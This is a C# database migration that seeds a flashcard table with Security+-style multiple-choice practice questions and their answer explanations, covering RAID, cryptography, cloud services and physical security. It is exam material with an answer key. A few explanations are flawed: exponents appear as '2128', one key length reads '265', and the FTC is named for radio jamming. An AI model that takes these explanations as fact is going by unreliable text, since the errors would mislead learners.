                values: new object[] { 337, "\r\n120. B. Nora has established a cold site. A cold site is a location that\r\ncan be brought online but does not have systems; cold sites\r\ntypically have access to power and bandwidth, but they need to\r\nbe fully equipped to operate after a disaster since they are just\r\nrented space. Warm sites have some or all of the infrastructure\r\nand systems Nora needs but does not have data. A hot site is a\r\nfully functional environment with all of the hardware, software,\r\nand data needed to operate an organization. They are expensive\r\nto maintain and run but are used by organizations that cannot\r\ntake the risk of downtime. A MOU is a memorandum of\r\nunderstanding and is not a type of disaster recovery site.\r\n", 2, "\r\n120. Nora has rented a building with access to bandwidth and power in case her organization\r\never experiences a disaster. What type of site has she established?\r\nA. A hot site\r\nB. A cold site\r\nC. A warm site\r\nD. A MOU site\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 256, "\r\n39. C. Ian should be concerned that attackers might be able to\r\nredirect short message service (SMS) messages sent to VoIP\r\nphones. This potential issue is one reason that some multifactor\r\ndeployments do not allow SMS messages to be sent to VoIP\r\nphones in the environment, and some organizations do not\r\nallow SMS as an option, instead requiring hardware tokens or\r\napplication-based multifactor authentication. Vishing is a type\r\nof phishing done via voice, voicemail hijacking would redirect\r\nvoicemail to another mailbox by forwarding calls, and weak\r\nmultifactor code injection was made up for this question.\r\n", 2, "\r\n39. Ian is concerned about VoIP phones used in his organization due to the use of SMS as part of\r\ntheir multifactor authentication rollout. What type attack should he be concerned about?\r\nA. A vishing attack\r\nB. A voicemail hijack\r\nC. An SMS token redirect\r\nD. A weak multifactor code injection\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 257, "\r\n40. A. Baseline configurations, per NIST 800-53: “Baseline\r\nconfigurations serve as a basis for future builds, releases, and/or\r\nchanges to information systems. Baseline configurations include\r\ninformation about information system components (e.g.,\r\nstandard software packages installed on workstations, notebook\r\ncomputers, servers, network components, or mobile devices;\r\ncurrent version numbers and patch information on operating\r\nsystems and applications; and configuration\r\nsettings/parameters), network topology, and the logical\r\nplacement of those components within the system architecture.\r\nMaintaining baseline configurations requires creating new\r\nbaselines as organizational information systems change over\r\ntime. Baseline configurations of information systems reflect the\r\ncurrent enterprise architecture.”\r\n", 2, "\r\n40. Angela wants to ensure that IoT devices in her organization have a secure configuration\r\nwhen they are deployed and that they are ready for further configuration for their specific\r\npurposes. What term is used to describe these standard configurations used as part of her\r\nconfiguration management program?\r\nA. A baseline configuration\r\nB. An essential settings list\r\nC. A preinstall checklist\r\nD. A setup guide\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 258, "\r\n41. B. HVAC systems are an important part of the availability for\r\nsystems and infrastructure. They are also a target for attackers\r\nwho target Internet of Things (IoT) or network-connected\r\ndevices. They are not frequent targets for use in social\r\nengineering efforts, although they could be used that way. They\r\nare not a primary line of defense for organizations.\r\n", 2, "\r\n41. Why is heating, ventilation, and air-conditioning (HVAC) part of organizational security\r\nplanning?\r\nA. Attackers often use HVAC systems as part of social engineering exercises.\r\nB. HVAC systems are important for availability.\r\nC. HVAC systems are a primary line of network defense.\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 259, "\r\n42. B. Symmetric encryption is typically faster than asymmetric\r\nencryption. This is why many protocols use asymmetric\r\nencryption to exchange a symmetric key, and then use that key\r\nfor the rest of their transaction. It is not more secure, key length\r\nis not a meaningful difference between symmetric and\r\nasymmetric encryption, and key distribution for symmetric\r\nencryption is more challenging for larger populations using\r\nsymmetric encryption if confidentiality needs to be maintained\r\nbecause every potential pair of communicators would need a\r\ndifferent symmetric key.\r\n", 2, "\r\n42. What advantage does symmetric encryption have over asymmetric encryption?\r\nA. It is more secure.\r\nB. It is faster.\r\nC. It can use longer keys.\r\nD. It simplifies key distributions.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 260, "\r\n43. C. Entropy is a measure of uncertainty. Having sources of\r\nentropy (or randomness) is a key element in a PRNG. Some\r\npseudo-random number generators rely on input from\r\nkeyboards, mice, or other human-generated inputs to have a\r\nsource of entropy data.\r\n", 2, "\r\n43. Laura knows that predictability is a problem in pseudo-random number generators (PRNGs)\r\nused for encryption operations. What term describes the measure of uncertainty used\r\nto a PRNG?\r\nA. Ellipses\r\nB. Quantum flux\r\nC. Entropy\r\nD. Primeness\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 261, "\r\n44. A. With the software as a service (SaaS) model, the consumer\r\nhas the ability to use applications provided by the cloud provider\r\nover the Internet. SaaS is a subscription service where software\r\nis licensed on a subscription basis. Platform as a service (PaaS)\r\nprovides the framework and underlying tools to build\r\napplications and services. Infrastructure as a service (IaaS)\r\nprovides the components of an entire network and systems\r\ninfrastructure. Hybrid models use both cloud and locally hosted\r\nsystems.\r\n", 2, "\r\n44. Which cloud service model gives the consumer the ability to use applications provided by the\r\ncloud provider over the Internet?\r\nA. SaaS\r\nB. PaaS\r\nC. IaaS\r\nD. Hybrid\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 262, "\r\n45. C. Resource policies are associated with a resource and allow\r\nyou to determine which principals have access to that resource\r\nas well as what actions they can take on it. Resource policies are\r\nnot used to set consumption limits.\r\n", 2, "\r\n45. Chris sets a resource policy in his cloud environment. What type of control does this allow\r\nhim to exert?\r\nA. It allows him to determine how much disk space can be used.\r\nB. It allows him to determine how much bandwidth can be used.\r\nC. It allows him to specify who has access to resources and what actions they can perform\r\non it.\r\nD. It allows him to specify what actions a resource can take on specific users.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 263, "\r\n46. D. Storage area network (SAN) replication copies the contents\r\nof one repository to another repository, such as an\r\norganization’s central SAN environment to a remote SAN at the\r\nhardware or block level.\r\n", 2, "\r\n46. Chris sets up SAN replication for his organization. What has he done?\r\nA. He has enabled RAID 1 to ensure that the SAN cannot lose data if a drive fails because\r\nthe drives are replicated.\r\nB. He has set up backups to a tape library for the SAN to ensure data resilience.\r\nC. He has built a second identical set of hardware for his SAN.\r\nD. He has replicated the data on one SAN to another at the block or hardware level.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 264, "\r\n47. C. A snapshot is an image of the virtual machine (VM) at some\r\npoint in time. It is standard practice to periodically take a\r\nsnapshot of a virtual system so that you can return that system\r\nto a last known good state. Sandboxing is the process of isolating\r\na system or software. The hypervisor is the mechanism through\r\nwhich the virtual environment interacts with the hardware, and\r\nelasticity is the ability for the system to scale.\r\n", 2, "\r\n47. Mike is a security analyst and has just removed malware from a virtual server. What feature\r\nof virtualization would he use to return the virtual server to a last known good state?\r\nA. Sandboxing\r\nB. Hypervisor\r\nC. Snapshot\r\nD. Elasticity\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 265, "\r\n48. D. RAID level 5 is disk striping with distributed parity. It can\r\nwithstand the loss of any single disk. RAID 0 is disk striping; it\r\ndoes not provide any fault tolerance. RAID 1 is mirroring. It\r\ndoes protect against the loss of a single disk but not with\r\ndistributed parity. RAID 3 is disk striping with dedicated parity.\r\nThis means a dedicated drive containing all the parity bits.\r\n", 2, "\r\n48. Lisa is concerned about fault tolerance for her database server. She wants to ensure that if\r\nany single drive fails, it can be recovered. What RAID level would support this goal while\r\nusing distributed parity bits?\r\nA. RAID 0\r\nB. RAID 1\r\nC. RAID 3\r\nD. RAID 5\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 266, "\r\n49. D. A Faraday cage, named after physicist Michael Faraday,\r\ninvolves placing wire mesh around an area or device to block\r\nelectromagnetic signals. A VLAN can segment a network but\r\nwon’t block electromagnetic interference (EMI). Softwaredefined\r\nnetworking (SDN) virtualizes a network but does not\r\nprotect against EMI. A Trusted Platform Module (TPM) is used\r\nfor cryptographic applications.\r\n", 2, "\r\n49. Jarod is concerned about EMI affecting a key escrow server. Which method would be most\r\neffective in mitigating this risk?\r\nA. VLAN\r\nB. SDN\r\nC. Trusted platform module\r\nD. Faraday cage\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 255, "\r\n38. C. You should implement a staging server so that code can be\r\ndeployed to an intermediate staging environment. This will\r\nallow testing of security features, as well as checking to see that\r\nthe code integrates with the entire system. Using third-party\r\nlibraries and software development kits (SDKs) can help reduce\r\nerrors and vulnerabilities in the code. Sandboxing is used to\r\nisolate a particular environment, and virtualization will not\r\nmitigate this risk. Even if the production server is virtualized,\r\nthe risks are the same. Finally, deployment policies are a good\r\nidea, but they are not the most effective way to mitigate this\r\nparticular risk.\r\n", 2, "\r\n38. Web developers in your company currently have direct access to the production server and\r\ncan deploy code directly to it. This can lead to unsecure code, or simply code flaws being\r\ndeployed to the live system. What would be the best change you could make to mitigate\r\nthis risk?\r\nA. Implement sandboxing.\r\nB. Implement virtualized servers.\r\nC. Implement a staging server.\r\nD. Implement deployment policies.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 267, "\r\n50. B. The correct answer is bollards. These are large objects, often\r\nmade of concrete or similar material, designed specifically to\r\nprevent a vehicle getting past them. Most gates can be breached\r\nwith a vehicle. A security guard is a good idea, but they would\r\nnot be able to stop a vehicle from ramming the building.\r\nSecurity cameras will provide evidence of a crime that was\r\ncommitted but won’t prevent the crime.\r\n", 2, "\r\n50. John is responsible for physical security at his company. He is particularly concerned about\r\nan attacker driving a vehicle into the building. Which of the following would provide the best\r\nprotection against this threat?\r\nA. A gate\r\nB. Bollards\r\nC. A security guard on duty\r\nD. Security cameras\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 269, "\r\n52. B. The correct answer is to incorporate two-factor\r\nauthentication with a mantrap. By having a smartcard at one\r\ndoor (type II authentication) and a PIN number (type I\r\nauthentication) at the other door, Joanne will combine strong\r\ntwo-factor authentication with physical security. Smartcards by\r\nthemselves, or paired with a fence, are still single-factor\r\nauthentication. Video surveillance, though often a good idea,\r\nwon’t help with two-factor authentication.\r\n", 2, "\r\n52. Joanne is responsible for security at a power plant. The facility is very sensitive and security\r\nis extremely important. She wants to incorporate two-factor authentication with physical\r\nsecurity. What would be the best way to accomplish this?\r\nA. Smartcards\r\nB. A mantrap with a smartcard at one door and a PIN keypad at the other door\r\nC. A mantrap with video surveillance\r\nD. A fence with a smartcard gate access\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 270, "\r\n53. A. Baselining is the process of establishing a standard for\r\nsecurity. A change from the original baseline configuration is\r\nreferred to as baseline deviation. Security evaluations or audits\r\ncheck security but don’t establish security standards. Hardening\r\nis the process of securing a given system, but it does not\r\nestablish security standards. Normalization is the process of\r\nremoving redundant entries from a database.\r\n", 2, "\r\n53. Which of the following terms refers to the process of establishing a standard for security?\r\nA. Baselining\r\nB. Security evaluation\r\nC. Hardening\r\nD. Normalization\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 271, "\r\n54. A. Fake telemetry is telemetry created to make an attacker\r\nbelieve that a honeypot system is a legitimate system. Building a\r\nbelievable honeypot requires making the system as realistic as\r\npossible. Deepfakes are artificial intelligence (AI)-created videos\r\nthat make it appear that individuals are saying or doing actions\r\nthey never actually performed. The rest of the options were\r\nmade up for this question.\r\n", 2, "\r\n54. Angela configures a honeypot to ongoing events like user logins and logouts, disk usage,\r\nprogram and script loads, and similar information. What is this type of deception called?\r\nA. Fake telemetry\r\nB. User emulation\r\nC. Honeyfakes\r\nD. Deepfakes\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 272, "\r\n55. A. RAID 1+0, or RAID 10, is a mirrored data set (RAID 1),\r\nwhich is then striped (RAID 0): a “stripe of mirrors.” RAID 6 is\r\ndisk striping with dual parity (distributed), RAID 0 is just\r\nstriping, and RAID 1 is just mirroring.\r\n", 2, "\r\n55. Which level of RAID is a “stripe of mirrors”?\r\nA. RAID 1+0\r\nB. RAID 6\r\nC. RAID 0\r\nD. RAID 1\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 273, "\r\n56. D. Normalization is the process of removing duplication or\r\nredundant data from a database. There are typically four levels\r\nof normalization ranging from 1N at the lowest (i.e., the most\r\nduplication) to 4N at the highest (i.e., the least duplication).\r\nAlthough database integrity is important, that is not what is\r\ndescribed in the question. Furthermore, integrity checking\r\nusually refers to checking the integrity of files. Deprovisioning is\r\na virtualization term for removing a virtual system (server,\r\nworkstation, etc.) and reclaiming those resources, and in the\r\ncontext of identity management means removing an account or\r\npermissions. Baselining involves setting security standards.\r\n", 2, "\r\n56. Isabella is responsible for database management and security. She is attempting to remove\r\nredundancy in the database. What is this process called?\r\nA. Integrity checking\r\nB. Deprovisioning\r\nC. Baselining\r\nD. Normalization\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 274, "\r\n57. C. Remote Authentication Dial-in User Service (RADIUS)\r\nprovides authentication, authorization, and accounting, which\r\nmake up the three critical elements in AAA systems. OpenID is a\r\nprotocol for authentication but does not provide authorization\r\nby itself. Lightweight Directory Access Protocol (LDAP) is a\r\ndirectory service, and Security Assertion Markup Language\r\n(SAML) is a markup language for making security assertions.\r\n", 2, "\r\n57. Gary wants to implement an AAA service. Which of the following services should he\r\nimplement?\r\nA. OpenID\r\nB. LDAP\r\nC. RADIUS\r\nD. SAML\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 275, "\r\n58. D. TLS inspection (often called SSL inspection because the\r\nterm SSL remains widely, if incorrectly, in use) involves\r\nintercepting encrypted traffic between the client and server. TLS\r\ninterception devices act as an on-path attack and decrypt traffic\r\nto scan and analyze it, often for malware or other signs of\r\nattacks, and then encrypt it to send it on to its destination. As\r\nyou might expect, TLS inspection has both legitimate and\r\nmalicious uses.\r\n", 2, "\r\n58. Where does TLS/SSL inspection happen, and how does it occur?\r\nA. On the client, using a proxy\r\nB. On the server, using a protocol analyzer\r\nC. At the certificate authority, by validating a request for a TLS certificate\r\nD. Between the client and server by intercepting encrypted communications\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 276, "\r\n59. D. In most cases none of these options are practical.\r\nDestruction of drones is an illegal destruction of private\r\nproperty. Jamming the open frequencies used for drones is not\r\npermissible and may result in action by the Federal Trade\r\nCommission (FTC), and contacting the Federal Aviation\r\nAdministration (FAA) to request that the airspace above a\r\ncompany be declared a no-fly zone is not something the FAA\r\nsupports in most cases. This means that Diana is likely to have\r\nto deal with the potential for drone-based threats in other ways.\r\n", 2, "\r\n59. Diana wants to prevent drones from flying over her organization’s property. What\r\ncan she do?\r\nA. Deploy automated drone take-down systems that will shoot the drones down.\r\nB. Deploy radio frequency jamming systems to disrupt the drone’s control frequencies.\r\nC. Contact the FAA to get her company’s property listed as a no-fly zone.\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 277, "\r\n60. B. Isaac has built and configured a system where\r\nnonpersistence of systems can create forensic challenges. His\r\norganization needs to consider how they can make copies of\r\ncompromised or problematic ephemeral systems and store them\r\nin a safe location for forensic analysis. This is not a forensicresistant\r\nsystem—if he had a copy, he would have been able to\r\nanalyze it. Live-boot media is not mentioned or used in this\r\nexample, and terminate and stay resident (TSR) is a type of\r\nprogram run in the DOS operating system that returned control\r\nto the operating system but remained in memory so that it could\r\nbe easily run again as needed.\r\n", 2, "\r\n60. Isaac has configured an infrastructure-as-code-based cloud environment that relies on codedefined\r\nsystem builds to spin up new systems as the services they run need to scale horizontally.\r\nAn attacker discovers a vulnerability and exploits a system in the cluster, but it is shut\r\ndown and terminated before they can perform a forensic analysis. What term describes this\r\ntype of environment?\r\nA. Forensic-resistant\r\nB. Nonpersistent\r\nC. Live-boot\r\nD. Terminate and stay resident\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 278, "\r\n61. D. Stored procedures are the best way to have standardized\r\nSQL. Rather than programmers writing their own SQL\r\ncommands, they simply call the stored procedures that the\r\ndatabase administrator creates. Formal code inspection might\r\ndetect a lack of security practices and defenses but won’t stop\r\nSQL-based attacks. Policies requiring stored procedures might\r\nhelp but are a less direct path to the solution. Finally, agile\r\nprogramming is a method for developing applications rapidly\r\nand won’t determine how SQL commands are created.\r\n", 2, "\r\n61. You are responsible for database security at your company. You are concerned that programmers\r\nmight pass badly written SQL commands to the database, or that an attacker might\r\nexploit badly written SQL in applications. What is the best way to mitigate this threat?\r\nA. Formal code inspection\r\nB. Programming policies\r\nC. Agile programming\r\nD. Stored procedures\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 279, "\r\n62. C. Services integration in cloud and virtualization\r\nenvironments can be very complex and can involve data, APIs,\r\nand other types of application integration. Integration platforms\r\nallow organizations to use a standardized tool rather than\r\nbuilding and maintaining their own. This allows them to focus\r\non the actual integrations rather than the underlying system,\r\nsaving time and effort. Since integration platforms also often\r\nhave preexisting tools for common services and APIs, they can\r\nsave significant amounts of time for organizations that adopt\r\nthem. Of course, this also introduces another platform to assess\r\nand secure.\r\n", 2, "\r\n62. Joanna’s company has adopted multiple software-as-a-service (SaaS) tools and now wants to\r\nbetter coordinate them so that the data that they each contain can be used in multiple services.\r\nWhat type of solution should she recommend if she wants to minimize the complexity of\r\nlong-term maintenance for her organization?\r\nA. Replace the SaaS service with a platform-as-a-service (PaaS) environment to move everything\r\nto a single platform.\r\nB. Build API-based integrations using in-house expertise.\r\nC. Adopt an integration platform to leverage scalability.\r\nD. Build flat-file integrations using in-house expertise.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 268, "\r\n51. A. Attaching cable locks to the computers and locking them to\r\nthe table will make it more difficult for someone to steal a\r\ncomputer. Full-disk encryption (FDE) won’t stop someone from\r\nstealing the computer, nor will strong passwords. A sign-in sheet\r\nis a good idea and may deter some thefts, but it is not the best\r\napproach to stopping theft offered in this scenario.\r\n", 2, "\r\n51. Mark is responsible for cybersecurity at a small college. There are many computer labs that\r\nare open for students to use. These labs are monitored only by a student worker, who may or\r\nmay not be very attentive. Mark is concerned about the theft of computers. Which of the following\r\nwould be the best way for him to mitigate this threat?\r\nA. Cable locks\r\nB. FDE on the lab computers\r\nC. Strong passwords on the lab computers\r\nD. Having a lab sign-in sheet\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 280, "\r\n63. B. When virtualization reaches the point that IT can no longer\r\neffectively manage it, the condition is known as VM sprawl. VM\r\noverload and VM spread are made up for this question, and a\r\nVM zombie is a term for a virtual machine that is running and\r\nconsuming resources but no longer has a purpose.\r\n", 2, "\r\n63. Farès is responsible for managing the many virtual machines on his company’s networks.\r\nOver the past two years, the company has increased the number of virtual machines significantly.\r\nFarès is no longer able to effectively manage the large number of machines. What is\r\nthe term for this situation?\r\nA. VM overload\r\nB. VM sprawl\r\nC. VM spread\r\nD. VM zombies\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 254, "\r\n37. B. Transit gateways are a transit hub used to connect VPCs\r\n(virtual private clouds) to on-premises networks. You can read\r\nmore about transit gateways at\r\ndocs.aws.amazon.com/vpc/latest/tgw/what-is-transitgateway.\r\nhtml. IBM uses the same term, but for a very specific\r\ninternal cloud connection.\r\n", 2, "\r\n37. What purpose does a transit gateway serve in cloud services?\r\nA. It connects systems inside of a cloud datacenter.\r\nB. It connects virtual private clouds and on-premises networks.\r\nC. It provides an API gateway between trust zones.\r\nD. It allows multicloud infrastructure designs.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 252, "\r\n35. B. Both Advanced Encryption Standard (AES) and Data\r\nEncryption Standard (DES) are block ciphers. That means that\r\nthey encrypt groups (blocks) of plain-text symbols together as a\r\nsingle block. If you know that either AES or DES is a block\r\ncipher, you can eliminate half of the options here. If you know\r\nthat a block cipher works on groups of symbols or blocks of text,\r\nyou can also eliminate half the options as incorrect.\r\n", 2, "\r\n35. AES and DES are an example of what type of cipher?\r\nA. Stream ciphers that encrypt groups of plain-text symbols all together\r\nB. Block ciphers that encrypt groups of plain-text symbols all together\r\nC. Stream ciphers that encrypt one plain-text symbol at a time\r\nD. Block ciphers that encrypt one plain-text symbol at a time\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 228, "\r\n11. D. An Arduino is a microcontroller well suited for custom\r\ndevelopment of embedded systems. They are small, inexpensive,\r\nand commonly available. Unlike a Raspberry Pi, they are not a\r\nsmall computer, reducing their overall risk of compromise. A\r\ncustom field-programmable gate array (FPGA) will typically be\r\nmore complex and expensive than an Arduino, whereas a\r\nrepurposed desktop PC introduces all the potential issues that a\r\nPC can include such as a vulnerable operating system or\r\nsoftware.\r\n", 2, "\r\n11. Trevor wants to use an inexpensive device to build a custom embedded system that can\r\nmonitor a process. Which of the following options is best suited for this if he wants to minimize\r\nexpense and maximize simplicity while avoiding the potential for system or device\r\ncompromise?\r\nA. A Raspberry Pi\r\nB. A custom FPGA\r\nC. A repurposed desktop PC\r\nD. An Arduino\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 229, "\r\n12. D. Digital signatures are created using the signer’s private key,\r\nallowing it to be validated using their public key.\r\n", 2, "\r\n12. Amanda wants to use a digital signature on an email she is sending to Maria. Which key\r\nshould she use to sign the email?\r\nA. Maria’s public key\r\nB. Amanda’s public key\r\nC. Maria’s private key\r\nD. Amanda’s private key\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 230, "\r\n13. C. Adding one bit to a key doubles the work required. The\r\noriginal effort would have 2128 potential solutions, whereas the\r\nincreased key length would require 2129. In real life, key lengths\r\naren’t increased by 1; instead, they are typically increased by\r\nfactors of 2, such as 128 to 265, or 1024 to 2048.\r\n", 2, "\r\n13. Nick wants to make an encryption key harder to crack, and he increases the key length by\r\none bit from a 128-bit encryption key to a 129-bit encryption key as an example to explain\r\nthe concept. How much more work would an attacker have to do to crack the key using\r\nbrute force if no other attacks or techniques could be applied?\r\nA. One more\r\nB. 129 more\r\nC. Twice as much\r\nD. Four times as much\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 231, "\r\n14. C. Key stretching is used to improve weak keys. One way of\r\nimplementing it is by repeatedly using a hash function or a block\r\ncipher, increasing the effort that an attacker would need to exert\r\nto attack the resulting hashed or encrypted data. The rest of the\r\noptions were made up.\r\n", 2, "\r\n14. Gurvinder knows that the OpenSSL passwd file protects passwords by using 1,000 rounds of\r\nMD5 hashing to help protect password information. What is this technique called?\r\nA. Spinning the hash\r\nB. Key rotation\r\nC. Key stretching\r\nD. Hash iteration\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 232, "\r\n15. A. A salt is a value added to a string before it is hashed. The salt\r\nis stored so that it can be added to passwords when they are\r\nused in the future to compare to the hash. Since each salt is\r\nunique, this means that an attacker would need to generate a\r\nunique rainbow table for every salt to be able to attack the stored\r\nhashes effectively. For high-value passwords, this may be\r\nworthwhile, but for bulk lists of passwords, it is not a reasonable\r\nattack method.\r\n", 2, "\r\n15. Fred wants to make it harder for an attacker to use rainbow tables to attack the hashed password\r\nvalues he stores. What should he add to every password before it is hashed to make it\r\nimpossible for the attacker to simply use a list of common hashed passwords to reveal the\r\npasswords Fred has stored if they gain access to them?\r\nA. A salt\r\nB. A cipher\r\nC. A spice\r\nD. A trapdoor\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 233, "\r\n16. C. Ian will use Michelle’s public key to encrypt the message so\r\nthat only she can read it using her private key. If he wanted to\r\nsign the message, he could use his private key, and Michelle\r\ncould use his public key to validate his signature. Neither Ian\r\nnor Michelle should ever reveal their private keys.\r\n", 2, "\r\n16. Ian wants to send an encrypted message to Michelle using public key cryptography. What key\r\ndoes he need to encrypt the message?\r\nA. His public key\r\nB. His private key\r\nC. Her public key\r\nD. Her private key\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 234, "\r\n17. A. Elliptical curve cryptography (ECC) is faster because it can\r\nuse a smaller key length to achieve levels of security similar to a\r\nlonger RSA key (a 228-bit elliptical curve key is roughly\r\nequivalent to a 2,380-bit RSA key). Using the same key to\r\nencrypt and decrypt would be true for a symmetric encryption\r\ncryptosystem; however, neither of these are symmetric. Either\r\nalgorithm can run on older processors given the right\r\ncryptographic libraries or programming, although both will be\r\nslower. Both can be used for digital signatures.\r\n", 2, "\r\n17. What key advantage does an elliptical curve cryptosystem have over an RSA-based\r\ncryptosystem?\r\nA. It can use a smaller key length for the same resistance to being broken.\r\nB. It requires only a single key to encrypt and decrypt.\r\nC. It can run on older processors.\r\nD. It can be used for digital signatures as well as encryption.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 235, "\r\n18. A. Perfect forward secrecy (PFS) is used to change keys used to\r\nencrypt and decrypt data, ensuring that even if a compromise\r\noccurs, only a very small amount of data will be exposed.\r\nSymmetric encryption uses a single key. Quantum key rotation\r\nand Diffie-Hellman key modulation are both terms made up for\r\nthis question.\r\n", 2, "\r\n18. What cryptographic capability ensures that even if the server’s private key is compromised,\r\nthe session keys will not be compromised?\r\nA. Perfect forward secrecy\r\nB. Symmetric encryption\r\nC. Quantum key rotation\r\nD. Diffie-Hellman key modulation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 236, "\r\n19. A. Checking a visitor’s ID against their log book entry can\r\nensure that the information they have recorded is correct and\r\nthat the person’s ID matches who they claim to be. Biometric\r\nscans only work on enrolled individuals, meaning that many\r\nguests may not have biometric data enrolled. Two-person\r\nintegrity control would only be useful if there was a concern that\r\na guard was allowing unauthorized individuals into the facility.\r\nA security robot typically cannot validate a visitor’s identity from\r\nan ID and log entry. This may change as they become more\r\nadvanced!\r\n", 2, "\r\n19. Alaina is reviewing practices for her reception desk and wants to ensure that the reception\r\ndesk’s visitor log is accurate. What process should she add to the guard’s check-in procedure?\r\nA. Check the visitor’s ID against their log book entry.\r\nB. Perform a biometric scan to validate visitor identities.\r\nC. Require two-person integrity control.\r\nD. Replace the guard with a security robot.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 237, "\r\n20. D. Honeypots are designed to attract a hacker by appearing to\r\nbe security holes that are ripe and ready for exploitation. A\r\nhoneynet is a network honeypot. This security technique is used\r\nto observe hackers in action while not exposing vital network\r\nresources. An intrusion detection system (IDS) is used to detect\r\nactivity that could indicate an intrusion or attack. Neither active\r\ndetection nor false subnet is a common industry term.\r\n", 2, "\r\n20. In an attempt to observe hacker techniques, a security administrator configures a nonproduction\r\nnetwork to be used as a target so that he can covertly monitor network attacks. What is\r\nthis type of network called?\r\nA. Active detection\r\nB. False subnet\r\nC. IDS\r\nD. Honeynet\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
